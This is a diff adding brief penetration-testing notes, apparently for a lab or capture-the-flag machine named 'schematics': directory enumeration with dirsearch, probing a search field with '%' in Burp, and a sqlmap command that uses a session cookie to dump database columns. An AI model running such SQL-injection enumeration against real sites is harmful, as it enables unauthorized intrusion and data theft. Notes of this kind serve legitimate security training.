@@ -1,0 +1,10 @@
+schematics
+
+dirsearch ip
+%-look for products
+make request in burp with '%'
+At this moment, we can conclude that the page with search functionalities 
+implemented is vulnerable to SQLi injection
+
+sqlmap --cookie="PHSESSID=cookievalue" -u url --forms --columns --random-agent
+
